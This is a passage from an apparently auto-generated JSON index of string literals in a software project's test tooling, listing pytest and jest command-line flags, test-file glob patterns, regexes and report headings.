        "(*args, **kwargs):\n    \"\"\"Test stub implementation for": {
          "value": "(*args, **kwargs):\n    \"\"\"Test stub implementation for",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}": {
          "value": "(*args, **kwargs):\n    \"\"\"Update item - test stub implementation.\"\"\"\n    return {\"status\": \"updated\", \"id\": kwargs.get('id', '1')}",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True": {
          "value": "(*args, **kwargs):\n    \"\"\"Verify/validate - test stub implementation.\"\"\"\n    return True",
          "category": "test_literals",
          "locations": []
        },
        "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?": {
          "value": "(?:# Add project root to path\\n)?import sys\\nfrom pathlib import Path\\nPROJECT_ROOT = Path\\(__file__\\)\\.parent\\.parent\\.parent\\nif str\\(PROJECT_ROOT\\) not in sys\\.path:\\n    sys\\.path\\.insert\\(0, str\\(PROJECT_ROOT\\)\\)\\n\\n?\\n?",
          "category": "test_literals",
          "locations": []
        },
        "(?:async )?def (test_\\w+)": {
          "value": "(?:async )?def (test_\\w+)",
          "category": "test_literals",
          "locations": []
        },
        "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]": {
          "value": "(?:test|it|describe)\\s*\\(\\s*['\\\"`]([^'\\\"`]+)['\\\"`]",
          "category": "test_literals",
          "locations": []
        },
        "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )": {
          "value": "(@pytest\\.mark\\.real_llm.*?\\n)(class |def |async def )",
          "category": "test_literals",
          "locations": []
        },
        "(Address when convenient)": {
          "value": "(Address when convenient)",
          "category": "test_literals",
          "locations": []
        },
        "(JS/TS)": {
          "value": "(JS/TS)",
          "category": "test_literals",
          "locations": []
        },
        "(Must fix immediately)": {
          "value": "(Must fix immediately)",
          "category": "test_literals",
          "locations": []
        },
        "(Score:": {
          "value": "(Score:",
          "category": "test_literals",
          "locations": []
        },
        "(Should fix soon)": {
          "value": "(Should fix soon)",
          "category": "test_literals",
          "locations": []
        },
        "([\\w/\\\\\\.]+::\\S+)": {
          "value": "([\\w/\\\\\\.]+::\\S+)",
          "category": "test_literals",
          "locations": []
        },
        "(\\d+) failed.*(\\d+) passed": {
          "value": "(\\d+) failed.*(\\d+) passed",
          "category": "test_literals",
          "locations": []
        },
        "(\\d+)\\s+passed.*?(\\d+)\\s+total": {
          "value": "(\\d+)\\s+passed.*?(\\d+)\\s+total",
          "category": "test_literals",
          "locations": []
        },
        "(\\w+)\\.return_value = (.+)": {
          "value": "(\\w+)\\.return_value = (.+)",
          "category": "test_literals",
          "locations": []
        },
        "(\\w+)\\.side_effect = (.+)": {
          "value": "(\\w+)\\.side_effect = (.+)",
          "category": "test_literals",
          "locations": []
        },
        "(\\w+)\\s*\\(": {
          "value": "(\\w+)\\s*\\(",
          "category": "test_literals",
          "locations": []
        },
        "(^|\\n)(async def": {
          "value": "(^|\\n)(async def",
          "category": "test_literals",
          "locations": []
        },
        "(^|\\n)(class": {
          "value": "(^|\\n)(class",
          "category": "test_literals",
          "locations": []
        },
        "(currently": {
          "value": "(currently",
          "category": "test_literals",
          "locations": []
        },
        "(end-to-end tests)": {
          "value": "(end-to-end tests)",
          "category": "test_literals",
          "locations": []
        },
        "(exception)": {
          "value": "(exception)",
          "category": "test_literals",
          "locations": []
        },
        "(excluding dependencies)": {
          "value": "(excluding dependencies)",
          "category": "test_literals",
          "locations": []
        },
        "(expected:": {
          "value": "(expected:",
          "category": "test_literals",
          "locations": []
        },
        "(integration tests)": {
          "value": "(integration tests)",
          "category": "test_literals",
          "locations": []
        },
        "(matched:": {
          "value": "(matched:",
          "category": "test_literals",
          "locations": []
        },
        "(self):": {
          "value": "(self):",
          "category": "test_literals",
          "locations": []
        },
        "(self):\n        \"\"\"Test": {
          "value": "(self):\n        \"\"\"Test",
          "category": "test_literals",
          "locations": []
        },
        "(shared utilities)": {
          "value": "(shared utilities)",
          "category": "test_literals",
          "locations": []
        },
        "(similarity:": {
          "value": "(similarity:",
          "category": "test_literals",
          "locations": []
        },
        "(too large)": {
          "value": "(too large)",
          "category": "test_literals",
          "locations": []
        },
        "(under 300 line limit)": {
          "value": "(under 300 line limit)",
          "category": "test_literals",
          "locations": []
        },
        "(unit tests)": {
          "value": "(unit tests)",
          "category": "test_literals",
          "locations": []
        },
        "(~": {
          "value": "(~",
          "category": "test_literals",
          "locations": []
        },
        ")": {
          "value": ")",
          "category": "test_literals",
          "locations": []
        },
        ") -": {
          "value": ") -",
          "category": "test_literals",
          "locations": []
        },
        "). Consider breaking down complex tests into simpler units.": {
          "value": "). Consider breaking down complex tests into simpler units.",
          "category": "test_literals",
          "locations": []
        },
        ")...": {
          "value": ")...",
          "category": "test_literals",
          "locations": []
        },
        "):": {
          "value": "):",
          "category": "test_literals",
          "locations": []
        },
        "): Creates confusion": {
          "value": "): Creates confusion",
          "category": "test_literals",
          "locations": []
        },
        "): Overlapping functionality": {
          "value": "): Overlapping functionality",
          "category": "test_literals",
          "locations": []
        },
        "): Should be consolidated": {
          "value": "): Should be consolidated",
          "category": "test_literals",
          "locations": []
        },
        "*": {
          "value": "*",
          "category": "test_literals",
          "locations": []
        },
        "**": {
          "value": "**",
          "category": "test_literals",
          "locations": []
        },
        "** (": {
          "value": "** (",
          "category": "test_literals",
          "locations": []
        },
        "***": {
          "value": "***",
          "category": "test_literals",
          "locations": []
        },
        "*** ALL WEBSOCKET TESTS PASSED! ***": {
          "value": "*** ALL WEBSOCKET TESTS PASSED! ***",
          "category": "test_literals",
          "locations": []
        },
        "**/": {
          "value": "**/",
          "category": "test_literals",
          "locations": []
        },
        "**/*.py": {
          "value": "**/*.py",
          "category": "test_literals",
          "locations": []
        },
        "**/*.test.js": {
          "value": "**/*.test.js",
          "category": "test_literals",
          "locations": []
        },
        "**/*.test.jsx": {
          "value": "**/*.test.jsx",
          "category": "test_literals",
          "locations": []
        },
        "**/*.test.ts": {
          "value": "**/*.test.ts",
          "category": "test_literals",
          "locations": []
        },
        "**/*.test.ts*": {
          "value": "**/*.test.ts*",
          "category": "test_literals",
          "locations": []
        },
        "**/*.test.tsx": {
          "value": "**/*.test.tsx",
          "category": "test_literals",
          "locations": []
        },
        "**/*_l3.py": {
          "value": "**/*_l3.py",
          "category": "test_literals",
          "locations": []
        },
        "**/*_test.py": {
          "value": "**/*_test.py",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/**/*.js": {
          "value": "**/__tests__/**/*.js",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/**/*.jsx": {
          "value": "**/__tests__/**/*.jsx",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/**/*.ts": {
          "value": "**/__tests__/**/*.ts",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/**/*.tsx": {
          "value": "**/__tests__/**/*.tsx",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)": {
          "value": "**/__tests__/@(components|hooks|store|services|lib|utils)/**/*.test.[jt]s?(x)",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/integration/**/*.test.[jt]s?(x)": {
          "value": "**/__tests__/integration/**/*.test.[jt]s?(x)",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/integration/critical-integration.test.tsx": {
          "value": "**/__tests__/integration/critical-integration.test.tsx",
          "category": "test_literals",
          "locations": []
        },
        "**/__tests__/system/startup.test.tsx": {
          "value": "**/__tests__/system/startup.test.tsx",
          "category": "test_literals",
          "locations": []
        },
        "**/conftest.py": {
          "value": "**/conftest.py",
          "category": "test_literals",
          "locations": []
        },
        "**/jest.setup.js": {
          "value": "**/jest.setup.js",
          "category": "test_literals",
          "locations": []
        },
        "**/setupTests.js": {
          "value": "**/setupTests.js",
          "category": "test_literals",
          "locations": []
        },
        "**/test*.py": {
          "value": "**/test*.py",
          "category": "test_literals",
          "locations": []
        },
        "**/test_*.py": {
          "value": "**/test_*.py",
          "category": "test_literals",
          "locations": []
        },
        "**/tests/**/*.py": {
          "value": "**/tests/**/*.py",
          "category": "test_literals",
          "locations": []
        },
        "**Description**:": {
          "value": "**Description**:",
          "category": "test_literals",
          "locations": []
        },
        "**Duration:**": {
          "value": "**Duration:**",
          "category": "test_literals",
          "locations": []
        },
        "**Error**:\n```": {
          "value": "**Error**:\n```",
          "category": "test_literals",
          "locations": []
        },
        "**Exit Code**:": {
          "value": "**Exit Code**:",
          "category": "test_literals",
          "locations": []
        },
        "**Generated:**": {
          "value": "**Generated:**",
          "category": "test_literals",
          "locations": []
        },
        "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.": {
          "value": "**IMPORTANT:** Manual refactoring is strongly recommended over automatic fixes.",
          "category": "test_literals",
          "locations": []
        },
        "**Output**:\n```": {
          "value": "**Output**:\n```",
          "category": "test_literals",
          "locations": []
        },
        "**Top Overlaps:**": {
          "value": "**Top Overlaps:**",
          "category": "test_literals",
          "locations": []
        },
        "**Total LLM Cost:** $": {
          "value": "**Total LLM Cost:** $",
          "category": "test_literals",
          "locations": []
        },
        "**Total Violations:**": {
          "value": "**Total Violations:**",
          "category": "test_literals",
          "locations": []
        },
        "**⚠️ WARNING:** Some tests are already failing. Fix these before refactoring!": {
          "value": "**⚠️ WARNING:** Some tests are already failing. Fix these before refactoring!",
          "category": "test_literals",
          "locations": []
        },
        "*.json": {
          "value": "*.json",
          "category": "test_literals",
          "locations": []
        },
        "*.py": {
          "value": "*.py",
          "category": "test_literals",
          "locations": []
        },
        "*.spec.*": {
          "value": "*.spec.*",
          "category": "test_literals",
          "locations": []
        },
        "*.spec.ts": {
          "value": "*.spec.ts",
          "category": "test_literals",
          "locations": []
        },
        "*.spec.tsx": {
          "value": "*.spec.tsx",
          "category": "test_literals",
          "locations": []
        },
        "*.test.*": {
          "value": "*.test.*",
          "category": "test_literals",
          "locations": []
        },
        "*.test.js": {
          "value": "*.test.js",
          "category": "test_literals",
          "locations": []
        },
        "*.test.jsx": {
          "value": "*.test.jsx",
          "category": "test_literals",
          "locations": []
        },
        "*.test.ts": {
          "value": "*.test.ts",
          "category": "test_literals",
          "locations": []
        },
        "*.test.ts*": {
          "value": "*.test.ts*",
          "category": "test_literals",
          "locations": []
        },
        "*.test.tsx": {
          "value": "*.test.tsx",
          "category": "test_literals",
          "locations": []
        },
        "*.ts": {
          "value": "*.ts",
          "category": "test_literals",
          "locations": []
        },
        "*.tsx": {
          "value": "*.tsx",
          "category": "test_literals",
          "locations": []
        },
        "*.yml": {
          "value": "*.yml",
          "category": "test_literals",
          "locations": []
        },
        "*_test.py": {
          "value": "*_test.py",
          "category": "test_literals",
          "locations": []
        },
        "*test*.py": {
          "value": "*test*.py",
          "category": "test_literals",
          "locations": []
        },
        "*test*.ts": {
          "value": "*test*.ts",
          "category": "test_literals",
          "locations": []
        },
        "*test.py": {
          "value": "*test.py",
          "category": "test_literals",
          "locations": []
        },
        ",": {
          "value": ",",
          "category": "test_literals",
          "locations": []
        },
        ", Improvement:": {
          "value": ", Improvement:",
          "category": "test_literals",
          "locations": []
        },
        ", Optimization:": {
          "value": ", Optimization:",
          "category": "test_literals",
          "locations": []
        },
        ", SPEC/testing.xml)": {
          "value": ", SPEC/testing.xml)",
          "category": "test_literals",
          "locations": []
        },
        ", first import at line": {
          "value": ", first import at line",
          "category": "test_literals",
          "locations": []
        },
        ", got": {
          "value": ", got",
          "category": "test_literals",
          "locations": []
        },
        ", jest.mock:": {
          "value": ", jest.mock:",
          "category": "test_literals",
          "locations": []
        },
        ", max_files=": {
          "value": ", max_files=",
          "category": "test_literals",
          "locations": []
        },
        ", skipping": {
          "value": ", skipping",
          "category": "test_literals",
          "locations": []
        },
        ", type:": {
          "value": ", type:",
          "category": "test_literals",
          "locations": []
        },
        ", using 'unit'": {
          "value": ", using 'unit'",
          "category": "test_literals",
          "locations": []
        },
        ", using simple line counting:": {
          "value": ", using simple line counting:",
          "category": "test_literals",
          "locations": []
        },
        ",\"": {
          "value": ",\"",
          "category": "test_literals",
          "locations": []
        },
        ",line=": {
          "value": ",line=",
          "category": "test_literals",
          "locations": []
        },
        "-": {
          "value": "-",
          "category": "test_literals",
          "locations": []
        },
        "- **": {
          "value": "- **",
          "category": "test_literals",
          "locations": []
        },
        "- **Average Score:**": {
          "value": "- **Average Score:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Critical:**": {
          "value": "- **Critical:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Exact Duplicates**:": {
          "value": "- **Exact Duplicates**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Exact Duplicates**: 0 ✅": {
          "value": "- **Exact Duplicates**: 0 ✅",
          "category": "test_literals",
          "locations": []
        },
        "- **Excessive conftest files** (": {
          "value": "- **Excessive conftest files** (",
          "category": "test_literals",
          "locations": []
        },
        "- **Failed**:": {
          "value": "- **Failed**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Failed:**": {
          "value": "- **Failed:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Files exceeding": {
          "value": "- **Files exceeding",
          "category": "test_literals",
          "locations": []
        },
        "- **Functions exceeding": {
          "value": "- **Functions exceeding",
          "category": "test_literals",
          "locations": []
        },
        "- **Highly Similar**:": {
          "value": "- **Highly Similar**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Hit Rate:**": {
          "value": "- **Hit Rate:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Hits:**": {
          "value": "- **Hits:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Inconsistent L3 pattern** used in": {
          "value": "- **Inconsistent L3 pattern** used in",
          "category": "test_literals",
          "locations": []
        },
        "- **Legacy test directories** found:": {
          "value": "- **Legacy test directories** found:",
          "category": "test_literals",
          "locations": []
        },
        "- **Major:**": {
          "value": "- **Major:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Max Score:**": {
          "value": "- **Max Score:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Min Score:**": {
          "value": "- **Min Score:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Minor:**": {
          "value": "- **Minor:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Misses:**": {
          "value": "- **Misses:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Multiple test configurations** (": {
          "value": "- **Multiple test configurations** (",
          "category": "test_literals",
          "locations": []
        },
        "- **Multiple test runners** (": {
          "value": "- **Multiple test runners** (",
          "category": "test_literals",
          "locations": []
        },
        "- **Non-standard naming** in": {
          "value": "- **Non-standard naming** in",
          "category": "test_literals",
          "locations": []
        },
        "- **Pass Rate:**": {
          "value": "- **Pass Rate:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Passed**:": {
          "value": "- **Passed**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Passed:**": {
          "value": "- **Passed:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Related**:": {
          "value": "- **Related**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Similar**:": {
          "value": "- **Similar**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Success Rate**:": {
          "value": "- **Success Rate**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Suggestion:** Extract helper methods or use fixtures": {
          "value": "- **Suggestion:** Extract helper methods or use fixtures",
          "category": "test_literals",
          "locations": []
        },
        "- **Suggestion:** Split into multiple focused test modules": {
          "value": "- **Suggestion:** Split into multiple focused test modules",
          "category": "test_literals",
          "locations": []
        },
        "- **Total Similarity Pairs**:": {
          "value": "- **Total Similarity Pairs**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Total Test Files**:": {
          "value": "- **Total Test Files**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Total Test Functions**:": {
          "value": "- **Total Test Functions**:",
          "category": "test_literals",
          "locations": []
        },
        "- **Total Tests:**": {
          "value": "- **Total Tests:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Total Validations:**": {
          "value": "- **Total Validations:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Total test files scanned:**": {
          "value": "- **Total test files scanned:**",
          "category": "test_literals",
          "locations": []
        },
        "- **Total violations:**": {
          "value": "- **Total violations:**",
          "category": "test_literals",
          "locations": []
        },
        "- ... and": {
          "value": "- ... and",
          "category": "test_literals",
          "locations": []
        },
        "- API:": {
          "value": "- API:",
          "category": "test_literals",
          "locations": []
        },
        "- All services correctly default to STAGING (not production)": {
          "value": "- All services correctly default to STAGING (not production)",
          "category": "test_literals",
          "locations": []
        },
        "- Allow dev login:": {
          "value": "- Allow dev login:",
          "category": "test_literals",
          "locations": []
        },
        "- Allow mock auth:": {
          "value": "- Allow mock auth:",
          "category": "test_literals",
          "locations": []
        },
        "- App:": {
          "value": "- App:",
          "category": "test_literals",
          "locations": []
        },
        "- Auth:": {
          "value": "- Auth:",
          "category": "test_literals",
          "locations": []
        },
        "- Avg Complexity:": {
          "value": "- Avg Complexity:",
          "category": "test_literals",
          "locations": []
        },
        "- CLAUDE.md (development standards)": {
          "value": "- CLAUDE.md (development standards)",
          "category": "test_literals",
          "locations": []
        },
        "- Configuration files:": {
          "value": "- Configuration files:",
          "category": "test_literals",
          "locations": []
        },
        "- Conftest files:": {
          "value": "- Conftest files:",
          "category": "test_literals",
          "locations": []
        },
        "- Cross-Category Overlaps:": {
          "value": "- Cross-Category Overlaps:",
          "category": "test_literals",
          "locations": []
        },
        "- Duplicates:": {
          "value": "- Duplicates:",
          "category": "test_literals",
          "locations": []
        },
        "- Ensures AI quality meets expectations": {
          "value": "- Ensures AI quality meets expectations",
          "category": "test_literals",
          "locations": []
        },
        "- Environment detection logic works as expected": {
          "value": "- Environment detection logic works as expected",
          "category": "test_literals",
          "locations": []
        },
        "- Errors in": {
          "value": "- Errors in",
          "category": "test_literals",
          "locations": []
        },
        "- Failed:": {
          "value": "- Failed:",
          "category": "test_literals",
          "locations": []
        },
        "- Failing:": {
          "value": "- Failing:",
          "category": "test_literals",
          "locations": []
        },
        "- File size violations:": {
          "value": "- File size violations:",
          "category": "test_literals",
          "locations": []
        },
        "- Fixed": {
          "value": "- Fixed",
          "category": "test_literals",
          "locations": []
        },
        "- Frontend:": {
          "value": "- Frontend:",
          "category": "test_literals",
          "locations": []
        },
        "- Full customer journey validation": {
          "value": "- Full customer journey validation",
          "category": "test_literals",
          "locations": []
        },
        "- Function size violations:": {
          "value": "- Function size violations:",
          "category": "test_literals",
          "locations": []
        },
        "- Highly Similar:": {
          "value": "- Highly Similar:",
          "category": "test_literals",
          "locations": []
        },
        "- Integration tests with mocks defeat the purpose of integration testing": {
          "value": "- Integration tests with mocks defeat the purpose of integration testing",
          "category": "test_literals",
          "locations": []
        },
        "- Internal Overlaps:": {
          "value": "- Internal Overlaps:",
          "category": "test_literals",
          "locations": []
        },
        "- Max violation:": {
          "value": "- Max violation:",
          "category": "test_literals",
          "locations": []
        },
        "- Mock component implementations in test files violate real test requirements": {
          "value": "- Mock component implementations in test files violate real test requirements",
          "category": "test_literals",
          "locations": []
        },
        "- OAuth configuration appropriate for each environment": {
          "value": "- OAuth configuration appropriate for each environment",
          "category": "test_literals",
          "locations": []
        },
        "- Passed:": {
          "value": "- Passed:",
          "category": "test_literals",
          "locations": []
        },
        "- Passing:": {
          "value": "- Passing:",
          "category": "test_literals",
          "locations": []
        },
        "- Risk of false positive test results hiding real bugs": {
          "value": "- Risk of false positive test results hiding real bugs",
          "category": "test_literals",
          "locations": []
        },
        "- SPEC/testing.xml (comprehensive testing standards)": {
          "value": "- SPEC/testing.xml (comprehensive testing standards)",
          "category": "test_literals",
          "locations": []
        },
        "- Skipped": {
          "value": "- Skipped",
          "category": "test_literals",
          "locations": []
        },
        "- Test directories:": {
          "value": "- Test directories:",
          "category": "test_literals",
          "locations": []
        },
        "- Test locations:": {
          "value": "- Test locations:",
          "category": "test_literals",
          "locations": []
        },
        "- Test runners found:": {
          "value": "- Test runners found:",
          "category": "test_literals",
          "locations": []
        },
        "- Tests validated:": {
          "value": "- Tests validated:",
          "category": "test_literals",
          "locations": []
        },
        "- Tests:": {
          "value": "- Tests:",
          "category": "test_literals",
          "locations": []
        },
        "- Total Lines:": {
          "value": "- Total Lines:",
          "category": "test_literals",
          "locations": []
        },
        "- Total test files:": {
          "value": "- Total test files:",
          "category": "test_literals",
          "locations": []
        },
        "- Total violations:": {
          "value": "- Total violations:",
          "category": "test_literals",
          "locations": []
        },
        "- Validates SLA compliance": {
          "value": "- Validates SLA compliance",
          "category": "test_literals",
          "locations": []
        },
        "- [ ]": {
          "value": "- [ ]",
          "category": "test_literals",
          "locations": []
        },
        "- [CRITICAL]:": {
          "value": "- [CRITICAL]:",
          "category": "test_literals",
          "locations": []
        },
        "- [MAJOR]:": {
          "value": "- [MAJOR]:",
          "category": "test_literals",
          "locations": []
        },
        "- [MINOR]:": {
          "value": "- [MINOR]:",
          "category": "test_literals",
          "locations": []
        },
        "- `": {
          "value": "- `",
          "category": "test_literals",
          "locations": []
        },
        "- app/tests/examples/test_real_functionality_examples.py (patterns)": {
          "value": "- app/tests/examples/test_real_functionality_examples.py (patterns)",
          "category": "test_literals",
          "locations": []
        },
        "- tests are already failing": {
          "value": "- tests are already failing",
          "category": "test_literals",
          "locations": []
        },
        "--": {
          "value": "--",
          "category": "test_literals",
          "locations": []
        },
        "--all": {
          "value": "--all",
          "category": "test_literals",
          "locations": []
        },
        "--api-port": {
          "value": "--api-port",
          "category": "test_literals",
          "locations": []
        },
        "--asyncio-mode=auto": {
          "value": "--asyncio-mode=auto",
          "category": "test_literals",
          "locations": []
        },
        "--auth-url": {
          "value": "--auth-url",
          "category": "test_literals",
          "locations": []
        },
        "--auto-split": {
          "value": "--auto-split",
          "category": "test_literals",
          "locations": []
        },
        "--backend-url": {
          "value": "--backend-url",
          "category": "test_literals",
          "locations": []
        },
        "--backup-dir": {
          "value": "--backup-dir",
          "category": "test_literals",
          "locations": []
        },
        "--base-url": {
          "value": "--base-url",
          "category": "test_literals",
          "locations": []
        },
        "--benchmark": {
          "value": "--benchmark",
          "category": "test_literals",
          "locations": []
        },
        "--build": {
          "value": "--build",
          "category": "test_literals",
          "locations": []
        },
        "--cache-dir": {
          "value": "--cache-dir",
          "category": "test_literals",
          "locations": []
        },
        "--cacheDirectory": {
          "value": "--cacheDirectory",
          "category": "test_literals",
          "locations": []
        },
        "--category": {
          "value": "--category",
          "category": "test_literals",
          "locations": []
        },
        "--check-deps": {
          "value": "--check-deps",
          "category": "test_literals",
          "locations": []
        },
        "--cleanup-on-exit": {
          "value": "--cleanup-on-exit",
          "category": "test_literals",
          "locations": []
        },
        "--clear-cache": {
          "value": "--clear-cache",
          "category": "test_literals",
          "locations": []
        },
        "--color=yes": {
          "value": "--color=yes",
          "category": "test_literals",
          "locations": []
        },
        "--confirm-unsafe": {
          "value": "--confirm-unsafe",
          "category": "test_literals",
          "locations": []
        },
        "--cov": {
          "value": "--cov",
          "category": "test_literals",
          "locations": []
        },
        "--cov-fail-under=": {
          "value": "--cov-fail-under=",
          "category": "test_literals",
          "locations": []
        },
        "--cov-report=html:reports/coverage/html": {
          "value": "--cov-report=html:reports/coverage/html",
          "category": "test_literals",
          "locations": []
        },
        "--cov-report=json": {
          "value": "--cov-report=json",
          "category": "test_literals",
          "locations": []
        },
        "--cov-report=json:reports/coverage/coverage.json": {
          "value": "--cov-report=json:reports/coverage/coverage.json",
          "category": "test_literals",
          "locations": []
        },
        "--cov-report=term-missing": {
          "value": "--cov-report=term-missing",
          "category": "test_literals",
          "locations": []
        },
        "--cov=app": {
          "value": "--cov=app",
          "category": "test_literals",
          "locations": []
        },
        "--cov=netra_backend.app": {
          "value": "--cov=netra_backend.app",
          "category": "test_literals",
          "locations": []
        },
        "--coverage": {
          "value": "--coverage",
          "category": "test_literals",
          "locations": []
        },
        "--coverageDirectory=": {
          "value": "--coverageDirectory=",
          "category": "test_literals",
          "locations": []
        },
        "--cypress-open": {
          "value": "--cypress-open",
          "category": "test_literals",
          "locations": []
        },
        "--detectOpenHandles": {
          "value": "--detectOpenHandles",
          "category": "test_literals",
          "locations": []
        },
        "--directory": {
          "value": "--directory",
          "category": "test_literals",
          "locations": []
        },
        "--disable-safe-mode": {
          "value": "--disable-safe-mode",
          "category": "test_literals",
          "locations": []
        },
        "--disable-warnings": {
          "value": "--disable-warnings",
          "category": "test_literals",
          "locations": []
        },
        "--dry-run": {
          "value": "--dry-run",
          "category": "test_literals",
          "locations": []
        },
        "--dry-run, -n     : Show what would be renamed without doing it": {
          "value": "--dry-run, -n     : Show what would be renamed without doing it",
          "category": "test_literals",
          "locations": []
        },
        "--durations=20": {
          "value": "--durations=20",
          "category": "test_literals",
          "locations": []
        },
        "--e2e": {
          "value": "--e2e",
          "category": "test_literals",
          "locations": []
        },
        "--env": {
          "value": "--env",
          "category": "test_literals",
          "locations": []
        },
        "--execute": {
          "value": "--execute",
          "category": "test_literals",
          "locations": []
        },
        "--execute         : Actually perform the renames": {
          "value": "--execute         : Actually perform the renames",
          "category": "test_literals",
          "locations": []
        },
        "--execute --limit=30": {
          "value": "--execute --limit=30",
          "category": "test_literals",
          "locations": []
        },
        "--fail-fast": {
          "value": "--fail-fast",
          "category": "test_literals",
          "locations": []
        },
        "--failed-first": {
          "value": "--failed-first",
          "category": "test_literals",
          "locations": []
        },
        "--ff": {
          "value": "--ff",
          "category": "test_literals",
          "locations": []
        },
        "--file": {
          "value": "--file",
          "category": "test_literals",
          "locations": []
        },
        "--fix": {
          "value": "--fix",
          "category": "test_literals",
          "locations": []
        },
        "--force": {
          "value": "--force",
          "category": "test_literals",
          "locations": []
        },
        "--force-unsafe-fix": {
          "value": "--force-unsafe-fix",
          "category": "test_literals",
          "locations": []
        },
        "--forceExit": {
          "value": "--forceExit",
          "category": "test_literals",
          "locations": []
        },
        "--format": {
          "value": "--format",
          "category": "test_literals",
          "locations": []
        },
        "--frontend-port": {
          "value": "--frontend-port",
          "category": "test_literals",
          "locations": []
        },
        "--full": {
          "value": "--full",
          "category": "test_literals",
          "locations": []
        },
        "--git-diff": {
          "value": "--git-diff",
          "category": "test_literals",
          "locations": []
        },
        "--github-actions": {
          "value": "--github-actions",
          "category": "test_literals",
          "locations": []
        },
        "--help": {
          "value": "--help",
          "category": "test_literals",
          "locations": []
        },
        "--help, -h        : Show this help": {
          "value": "--help, -h        : Show this help",
          "category": "test_literals",
          "locations": []
        },
        "--host": {
          "value": "--host",
          "category": "test_literals",
          "locations": []
        },
        "--html-output": {
          "value": "--html-output",
          "category": "test_literals",
          "locations": []
        },
        "--html=reports/tests/report.html": {
          "value": "--html=reports/tests/report.html",
          "category": "test_literals",
          "locations": []
        },
        "--install-deps": {
          "value": "--install-deps",
          "category": "test_literals",
          "locations": []
        },
        "--integration-first": {
          "value": "--integration-first",
          "category": "test_literals",
          "locations": []
        },
        "--isolation": {
          "value": "--isolation",
          "category": "test_literals",
          "locations": []
        },
        "--json": {
          "value": "--json",
          "category": "test_literals",
          "locations": []
        },
        "--json-output": {
          "value": "--json-output",
          "category": "test_literals",
          "locations": []
        },
        "--json-report": {
          "value": "--json-report",
          "category": "test_literals",
          "locations": []
        },
        "--json-report-file=reports/tests/report.json": {
          "value": "--json-report-file=reports/tests/report.json",
          "category": "test_literals",
          "locations": []
        },
        "--json-report-file=test_results.json": {
          "value": "--json-report-file=test_results.json",
          "category": "test_literals",
          "locations": []
        },
        "--keyword": {
          "value": "--keyword",
          "category": "test_literals",
          "locations": []
        },
        "--level": {
          "value": "--level",
          "category": "test_literals",
          "locations": []
        },
        "--limit=": {
          "value": "--limit=",
          "category": "test_literals",
          "locations": []
        },
        "--limit=N, -lN    : Process only first N files": {
          "value": "--limit=N, -lN    : Process only first N files",
          "category": "test_literals",
          "locations": []
        },
        "--lint": {
          "value": "--lint",
          "category": "test_literals",
          "locations": []
        },
        "--list": {
          "value": "--list",
          "category": "test_literals",
          "locations": []
        },
        "--markers": {
          "value": "--markers",
          "category": "test_literals",
          "locations": []
        },
        "--max-files": {
          "value": "--max-files",
          "category": "test_literals",
          "locations": []
        },
        "--maxWorkers=1": {
          "value": "--maxWorkers=1",
          "category": "test_literals",
          "locations": []
        },
        "--maxWorkers=2": {
          "value": "--maxWorkers=2",
          "category": "test_literals",
          "locations": []
        },
        "--maxfail=1": {
          "value": "--maxfail=1",
          "category": "test_literals",
          "locations": []
        },
        "--maxfail=50": {
          "value": "--maxfail=50",
          "category": "test_literals",
          "locations": []
        },
        "--min-coverage": {
          "value": "--min-coverage",
          "category": "test_literals",
          "locations": []
        },
        "--module": {
          "value": "--module",
          "category": "test_literals",
          "locations": []
        },
        "--name-only": {
          "value": "--name-only",
          "category": "test_literals",
          "locations": []
        },
        "--no-bad-test-detection": {
          "value": "--no-bad-test-detection",
          "category": "test_literals",
          "locations": []
        },
        "--no-browser": {
          "value": "--no-browser",
          "category": "test_literals",
          "locations": []
        },
        "--no-cache": {
          "value": "--no-cache",
          "category": "test_literals",
          "locations": []
        },
        "--no-env-setup": {
          "value": "--no-env-setup",
          "category": "test_literals",
          "locations": []
        },
        "--no-fail-fast": {
          "value": "--no-fail-fast",
          "category": "test_literals",
          "locations": []
        },
        "--no-header": {
          "value": "--no-header",
          "category": "test_literals",
          "locations": []
        },
        "--no-summary": {
          "value": "--no-summary",
          "category": "test_literals",
          "locations": []
        },
